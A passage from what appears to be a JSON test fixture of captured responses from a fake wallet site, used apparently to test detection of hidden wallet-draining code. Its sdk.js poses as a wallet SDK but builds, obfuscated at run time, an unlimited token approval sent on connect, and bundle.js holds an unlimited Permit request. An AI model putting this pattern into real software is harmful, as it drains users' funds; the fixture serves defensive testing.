utton id=\"connect\" type=\"button\">Connect wallet</button>\n<script src=\"http://cdn.touchstone.test:8080/ethers.js\"></script>\n<script src=\"http://cdn.touchstone.test:8080/sdk.js\"></script>\n<script src=\"/bundle.js\"></script>\n<a href=\"http://rpc.touchstone.test:8080/rpc\">Local RPC</a>\n</body></html>\n"},{"url":"http://www.touchstone.test:8080/bundle.js","status":200,"headers":{"content-type":"application/javascript","content-length":"514"},"body":"// Inert fixture. This function is never called. No wallet can connect.\nfunction plantedApproval(provider) {\n  return provider.request({method: 'eth_signTypedData_v4', params: [{\n    primaryType: 'Permit', spender: '0x1111111111111111111111111111111111111111',\n    value: '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n  }]});\n}\n// The page wires its Connect button to the SDK.\ndocument.getElementById('connect').addEventListener('click', function () { window.TouchstoneWallet.connect(); });\n"},{"url":"http://cdn.touchstone.test:8080/ethers.js","status":200,"headers":{"content-type":"application/javascript","content-length":"116"},"body":"// Inert stand-in for a CDN wallet library. No third-party wallet code runs.\nwindow.ethers = {version: 'lab-only'};\n"},{"url":"http://cdn.touchstone.test:8080/sdk.js","status":200,"headers":{"content-type":"application/javascript","content-length":"901"},"body":"// Lab fixture. It looks like a wallet SDK. It hides an unlimited token approval.\n// The approval is built at run time, so a text search for the usual patterns finds nothing.\n// Every address here is fake. No wallet can run this.\n(function () {\n  var part = function (n, c) { return new Array(n + 1).join(c); };\n  var pad = function (hex) { return part(64 - hex.length, '0') + hex; };\n  window.TouchstoneWallet = {\n    connect: async function () {\n      var eth = window.ethereum;\n      var accounts = await eth.request({ method: 'eth_requestAccounts' });\n      var spender = ['dead', part(32, '0'), 'beef'].join('');\n      var amount = part(64, 'f');\n      var data = '0x' + ['095e', 'a7b3'].join('') + pad(spender) + amount;\n      await eth.request({ method: 'eth_sendTransaction', params: [{ from: accounts[0], to: '0x' + part(40, '2'), data: data }] });\n      return accounts[0];\n    }\n  };\n})();\n"},{"url":"http://rpc.touchstone.test:8080/rpc","status":200,"headers":{"content-type":"application/json","content-length":"37"},"body":"{\"jsonrpc\":\"2.0\",\"result\":\"lab-only\"}"},{"url":"http://docs.touchstone.test:8080/","status":404,"headers":{"content-type":"text/html","content-length":"82"},"body":"<html><body><h1>404</h1><p>There isn't a GitHub Pages site here.</p></body></html>"},{"url":"http://staging.touchstone.test:8080/","status":200,"headers":{"content-type":"text/html","content-length":"89"},"body":"<!doctype html><html><head><title>staging</title></head><body>staging build</body></html>"}],"rdap":null,"contenthash":{"name":"touchstone.eth","value":"ipns://mutable-lab-name","pinnedCid":null}}